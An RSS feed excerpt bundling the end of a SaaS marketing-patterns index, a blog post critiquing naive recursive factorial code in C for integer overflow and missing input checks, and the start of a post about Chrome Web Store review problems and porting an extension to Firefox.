					<p><a href="https://terrygodier.com/patterns/buy-data-from-google/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png" alt="buy data 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Use Google Ads to Buy Data from Google 8" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/build-a-qa-library/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png" alt="qa library 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Q&amp;A Library for SEO Growth 9" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/build-a-qa-library/">How to Build a Q&amp;A Library for SEO Growth</a></h2>
						<p>Answering questions for your target audience builds credibility. Q&amp;A content has several viable distribution channels, which can help drive traffic and sales.</p>						<p><time datetime="2020-10-23T11:43:34+00:00">10/23/2020 11:43am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png" alt="lifetime deals 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to do a Lifetime Deal on Your Product 10" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/">How to do a Lifetime Deal on Your Product</a></h2>
						<p>Running a large discount or lifetime deal allows you to drive significant amounts of users (and revenue), which can later be upsold for revenue expansion or leveraged for network effects.</p>						<p><time datetime="2020-10-21T14:39:15+00:00">10/21/2020 2:39pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/real-money-referral-programs/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png" alt="referral 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Real Money Referral Program Best Practices 11" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/send-a-monthly-newsletter/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png" alt="newsletter 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Monthly Newsletter That Converts 12" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/integrate-into-an-ecosystem/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png" alt="integrate 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="API Marketing: How to Integrate Into an Ecosystem 13" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/become-a-perk/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png" alt="perks 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Get Your Product Listed as a Perk 14" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/become-a-perk/">How to Get Your Product Listed as a Perk</a></h2>
						<p>Many training programs and communities offer membership perks, which include discounts and trials of tools and services. Become one and get users and sales. </p>						<p><time datetime="2020-10-08T14:54:27+00:00">10/8/2020 2:54pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/co-hosting-webinars-for-leads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png" alt="co host webinar 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Lead Gen: How to Co-host a Webinar 15" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/technology-profiling-for-prospects/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png" alt="profiling 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Marketing with BuiltWith: Technology Profiling for Prospects 16" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/inclusion-on-best-lists/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png" alt="best lists 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Get Your Product Included on &quot;Best&quot; Lists 17" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png" alt="rlsa broad 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Run RLSAs and Target Broad Queries 18" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/">How to Run RLSAs and Target Broad Queries</a></h2>
						<p>RLSAs allow you to bid on broad keywords but only for a specific audience that’s already familiar with your brand, therefore increasing the likelihood of a conversion outcome. </p>						<p><time datetime="2020-09-24T17:00:26+00:00">09/24/2020 5:00pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-comparison-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png" alt="comparison 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Beat Your Competitors With Comparison Content 19" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/competitor-comparison-content/">Beat Your Competitors With Comparison Content</a></h2>
						<p>Prospective customers often compare products before they make a purchase. Use this pattern to get in front of them during this crucial phase and remind them why your product is superior. </p>						<p><time datetime="2020-09-23T15:33:47+00:00">09/23/2020 3:33pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-cancel-jacking/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png" alt="cancel jacking 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Steal Competitors Customers With Cancel Jacking 20" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								

			</section>
		</div></div>]]>
            </description>
            <link>https://terrygodier.com/patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116276</guid>
            <pubDate>Fri, 12 Feb 2021 17:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Factorial Function in C]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26116202">thread link</a>) | @hdante
<br/>
February 12, 2021 | https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html | <a href="https://web.archive.org/web/*/https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <article>
    

  <h5>Posted at <time>2021-02-08 21:37+0000</time>
  
  </h5>

  
  

  <p><strong>TLDR:</strong> The most common implementations of the factorial function in C do not handle
errors correctly and have typical code vulnerabilities. The factorial function should
include error handling even when only for the goal of teaching recursion, so that
beginners get used to writing robust code.</p>

<p><strong>Note:</strong> If you need a real factorial function, or its logarithm to do number theoretical
calculations, it’s available in the C standard library as <code>tgammal()</code> and <code>lgammal()</code>
functions <a href="#ref-glibc-math">[1]</a><a href="#ref-posix-tgammal">[2]</a><a href="#ref-posix-lgammal">[3]</a>.</p>

<figure>
  <a href="https://commons.wikimedia.org/wiki/File:Cliche_Hacker_and_Binary_Code_(26614834084).jpg" target="_blank">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Cliche_Hacker_and_Binary_Code_%2826614834084%29.jpg" alt="Hooded hacker at keyboard with binary code in front">
  </a>
  <figcaption>
    According to the
    <a href="https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html" target="_blank">
    2020 Common Weakness Enumeration (CWE™) Top 25 Most Dangerous Software Weakness
    list</a>, buffer attacks are the second (out-of-bounds write) and fourth
    (out-of-bounds read) most dangerous software weaknesses. Improper input validation
    is third and integer overflow is eleventh.
  </figcaption>
</figure>

<p><span>!☕</span> The C language was created shortly after the Unix
operating system in the 1970’s, so that the new operating system could be written in a
simple and efficient programming language, instead of
assembly <a href="#ref-chistory">[4]</a>. Portability soon became a motivation too: to be able
to run Unix and applications in heterogeneous systems caused the operating system and the
C programming language to have a profound and long lasting impact on computer
systems <a href="#ref-tiobe-index">[5]</a><a href="#ref-stackoverflow">[6]</a><a href="#ref-ctoday">[7]</a><a href="#ref-unixhistory">[8]</a><a href="#ref-unixtoday">[9]</a>.
Simplicity, efficiency and portability, built into the language and transformed into
programming philosophy, came with a price. When programming in C, if you want it, you’ll
have it. That includes writing broken code, invoking behavior not defined by the language
and, in general, allowing you, without questioning, to “shoot your own foot”. Those who do
not program in C might believe this wouldn’t affect them. Remember, though, that many
modern languages were influenced and even replicated C syntax and
behavior <a href="#ref-cfamily">[10]</a>. Even for languages that were not directly influenced
by C, simplicity and efficiency requirements may still cause a lot of
<a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment" target="_blank">astonishment</a>.</p>

<p>In this post, we’ll begin by writing a couple of factorial function implementations in C
that 9 out of the first 10 Google Search results implement. Then, we’ll discuss the
problems, present a minimal robust implementation and finally discuss about different ways
of doing error handling in C, so that, in the end you feel motivated to always write
robust code.</p>

<h3 id="recursive-factorial">Recursive factorial</h3>

<p>So here we go, this is the “Google version” of the recursive factorial function written in
C:</p>

<div><div><pre><code><span>#include &lt;stdio.h&gt;
</span>
<span>int</span> <span>factorial</span><span>(</span><span>int</span> <span>n</span><span>)</span>
<span>{</span>
	<span>/* This basic recursive factorial function is widespread
	 * on the Internet, but results in incorrect results most
	 * of the time, contains a stack overflow and integer
	 * underflow. */</span>
	<span>if</span> <span>(</span><span>n</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>1</span><span>;</span>

	<span>return</span> <span>n</span><span>*</span><span>factorial</span><span>(</span><span>n</span><span>-</span><span>1</span><span>);</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
	<span>int</span> <span>x</span><span>;</span>

	<span>/* Missing error checking on standard I/O. */</span>
	<span>printf</span><span>(</span><span>"Input a number: "</span><span>);</span>
	<span>scanf</span><span>(</span><span>"%d"</span><span>,</span> <span>&amp;</span><span>x</span><span>);</span>
	<span>printf</span><span>(</span><span>"The factorial of %d is: %d</span><span>\n</span><span>"</span><span>,</span> <span>x</span><span>,</span> <span>factorial</span><span>(</span><span>x</span><span>));</span>

	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Let’s compile and run this program:</p>

<pre><code>$ cc -o fact0 fact0.c
$ ./fact0
Input a number: 100
The factorial of 100 is: 0
$
</code></pre>

<p>So the factorial of 100 is 0. Or is it ? Factorials are positive integers. Have we
written anything wrong ? A quick search online shows that there are indeed
implementations exactly like this and that the mathematical recursive formula for the
factorial is correct. Also, for some numbers the program correctly calculates the result:</p>

<pre><code>$ ./fact0
Input a number: 5
The factorial of 5 is: 120
$ ./fact0
Input a number: 12
The factorial of 12 is: 479001600
$
</code></pre>

<h3 id="interlude-factorial-in-python">Interlude: factorial in Python</h3>

<p>Let’s put this code on hold for a moment and implement exactly the same algorithm in
Python:</p>

<div><div><pre><code><span>#!/usr/bin/env python3
</span><span>def</span> <span>factorial</span><span>(</span><span>n</span><span>):</span>
    <span># Incomplete factorial implementation, but better than C
</span>    <span># (all behavior is defined by the language).
</span>    <span>if</span> <span>n</span> <span>==</span> <span>0</span><span>:</span> <span>return</span> <span>1</span>

    <span>return</span> <span>n</span><span>*</span><span>factorial</span><span>(</span><span>n</span><span>-</span><span>1</span><span>)</span>

<span>def</span> <span>main</span><span>():</span>
    <span>x</span> <span>=</span> <span>int</span><span>(</span><span>input</span><span>(</span><span>'Input a number: '</span><span>))</span>
    <span>print</span><span>(</span><span>'The factorial of %d is: %d'</span> <span>%</span> <span>(</span><span>x</span><span>,</span> <span>factorial</span><span>(</span><span>x</span><span>)))</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>'__main__'</span><span>:</span> <span>main</span><span>()</span>
</code></pre></div></div>

<p>Running this program outputs:</p>

<pre><code>$ ./fact.py
Input a number: 100
The factorial of 100 is: 93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000
$ ./fact.py
Input a number: 5
The factorial of 5 is: 120
$ ./fact.py
Input a number: 12
The factorial of 12 is: 479001600
$
</code></pre>

<p>Ok, now it makes sense. The Python programming language, using arbitrary precision integer
numbers is able to correctly calculate the factorial using the recursive formula. In the
case of C, the integer data type (<code>int</code>) is a fixed width binary integer number (on my
computer, a 32-bit integer), without a defined overflow behavior. I can confirm this is
causing problems by using the undefined behavior detector library from my C compiler:</p>

<pre><code>$ cc -o fact0 fact0.c -fsanitize=undefined
$ ./fact0
Input a number: 100
fact0.c:10:10: runtime error: signed integer overflow: 13 * 479001600 cannot be represented in type 'int'
The factorial of 100 is: 0
$
</code></pre>

<p>So, that’s it, we’ve found it. Not only integer overflow is happening, we’ve confirmed by
using the undefined behavior detector that signed integer overflow in C is undefined
behavior. Due to the motivation of being small, efficient and portable to write an
operating system 50 years ago, the language rules won’t bother considering this case: what
happens when an integer operation overflows ? The language states that it’s
undefined. Anything is allowed to happen (like crashing the program or exploding a
spaceship). The reason for this is that this might be used for some kind of benefit,
typically related to performance and compiler simplicity, for a certain type of computer.
For example, for my compiler with default flags, integer overflows simply wrap around to
the minimum possible value because, when compiled, it results in the fastest possible
integer arithmetic code for my machine, and could be used for modular value calculations,
if desired. Other computers are free to implement a different behavior, also striving for
the fastest performance, if desired. This means that undefined behavior in C is part of
the language specification that helps guaranteeing that the language will be both portable
and performant in heterogeneous systems. Undefined behavior is arguably one of the reasons
C is so widespread for writing high performance system software. Consider, for example,
the modern high performance language <a href="https://www.rust-lang.org/" target="_blank">Rust</a>,
praised for its modern safety features <a href="#ref-rustsafety">[11]</a>, and, in my opinion,
one of the best contenders for replacing C++ in the near future, also
<a href="https://doc.rust-lang.org/book/ch03-02-data-types.html?highlight=overflow#integer-overflow" target="_blank">opting to allow silent integer overflows, yet stating that relying on it is considered an error</a>.
More commonly nowadays, however, since computers are becoming more homogeneous, the
unexpected result will simply cause a bug, without offering any other portability benefit.
Worse yet, in our specific case, compiling with default flags mentioned nothing. The
programmer was allowed to do that and the C compiler was silent about that.</p>

<h3 id="as-buggy-as-possible">As buggy as possible</h3>

<p>In the latest international C draft standard (ISO C 2017/2018 <a href="#ref-isoc17">[12]</a>),
undefined behavior is defined as the following:</p>

<blockquote>
  <p>3.4.3 undefined behavior</p>

  <p>behavior, upon use of a nonportable or erroneous program construct or of erroneous data,
for which this International Standard imposes no requirements</p>

  <p>(…)</p>

  <p>EXAMPLE An example of undefined behavior is the behavior on integer overflow.</p>
</blockquote>

<p>If the C programming language “imposes no requirements” on the behavior of integer
overflow, someone must. That someone is you, the programmer. You are allowed to shoot
your own foot, but if you’re smart you won’t.</p>

<p>Now any pragmatic programmer would think that this discussion doesn’t really make sense,
since the only goal of the recursive factorial function is to teach recursion and only
scratch the surface of C programming, so this discussion is meaningless. If that were the
whole story I would agree with that too and never waste my time writing this, but the
truth is that even though we must keep it simple, we have gone too far:</p>

<blockquote>
  <p><a href="https://quoteinvestigator.com/2011/05/13/einstein-simple/" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Albert_Einstein_-_pixabay.svg" alt="Einstein">“Everything should be made as simple as possible, but not simpler” – Some really smart guy</a></p>
</blockquote>

<p>In the C factorial example we have gone beyond as simple as possible and the code has
become oversimplified and thus incorrect. What I’m talking about is the amount of program
failures caused by buffer overflows, rounding errors, uninitialized memory access,
insufficient input validations and others that are main causes of electronic device
misbehaviors and exploitations in modern information technology. Famous bugs include the
$370 million Ariane 5 rocket explosion <a href="#ref-ariane5">[13]</a> and the Year 2000
bug <a href="#ref-y2k">[14]</a>, both caused by numeric overflows. Less impactful were the
integer overflows caused by the addictive Gangnam Style music video being viewed more than
2^31 times on YouTube <a href="#ref-gangnam">[15]</a> and Paypal depositing $92 quadrillion
(2^63 dollars) into the account of a user <a href="#ref-quadrillion">[16]</a>. On the other
hand, the cyberwarfare Stuxnet virus, believed to have been created by the Israeli and
American governments to damage Iranian uranium enrichment
centrifuges <a href="#ref-stuxnet">[17]</a>, was able to successfully spread by using a kind
of improper input validation when displaying Windows shortcut files and receiving Windows
Print Spooler commands, that allowed executing code where there should be only
non-verified data (thus, the vulnerability is called remote code execution).</p>

<p>Yearly lists of most dangerous software errors, besides misconfiguration and weak security
practices, always include out-of-bounds accesses, NULL pointer dereference, improper input
validation and use after freeing dynamic
memory <a href="#ref-vuln1">[18]</a><a href="#ref-vuln2">[19]</a><a href="#ref-vuln3">[20]</a>. These errors are
allowed by the C language, so it’s the programmer’s task to avoid them. If these fall in
the top list of most dangerous software errors, first of all it means they are difficult
to avoid even for skilled programmers and second, programmers are not trained well enough
to avoid them. So, every …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html">https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html</a></em></p>]]>
            </description>
            <link>https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116202</guid>
            <pubDate>Fri, 12 Feb 2021 17:36:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's time to port your extension to Firefox]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 17 (<a href="https://news.ycombinator.com/item?id=26116105">thread link</a>) | @DanielDe
<br/>
February 12, 2021 | https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox | <a href="https://web.archive.org/web/*/https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
        <h4>February 12th, 2021 · 5 minute read</h4>

        <p>
          I've seen quite a <a href="https://news.ycombinator.com/item?id=21990566">few</a> <a href="https://blog.pushbullet.com/2020/05/13/lets-guess-what-google-requires-in-14-days-or-they-kill-our-extension/">people</a> <a href="https://blog.lipsurf.com/part-ii-after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why/">complaining</a> lately about the Kafkaesque Chrome extension review process, so when I started running into my own problems with the Chrome Web Store I wasn't exactly surprised.
        </p>

        <p>
          It wasn’t until I submitted the same extension to the Firefox Add-Ons Store that I saw just how good things could be. In a world of walled gardens watched over by heavy handed reviewers, Firefox's review process was laughably good.
        </p>

        <section>
          

          <p>
            In January 2020 my buddy and I started working on an idea we had for an automation app. We called it Otto.
          </p>

          <p>
            Otto consisted of two parts: a Mac app and a browser extension. After a few months worth of nights and weekends we had an alpha version we were ready to share with friends. I submitted the browser extension to Chrome under my own personal account, and after a review process of a couple days it was accepted. So far so good.
          </p>
        </section>

        <section>
          

          <p>
            The trouble started a few months later. After some more development and discussion, we re-framed our idea as an app to make custom keyboard shortcuts and we decided to rename Otto to <a href="https://keysmith.app/">Keysmith</a>. We also took the time at this point to create a company Google account. We renamed the extension and submitted it from our new company account.
          </p>

          <p>
            To be clear: changing the name was the <i>only</i> change we made.
          </p>

          <p>
            A few days later we received a rejection email. Here's a timeline of our interaction:
          </p>

          <div>
            
            <p>
                We submit Keysmith to the Chrome Web Store.
              </p>
          </div>

          <div>
            
            <div>
              <p>
                First rejection email.

                Quick summary:
              </p>

              <ul>
                <li>Keysmith "violates the 'Use of Permissions' section"</li>
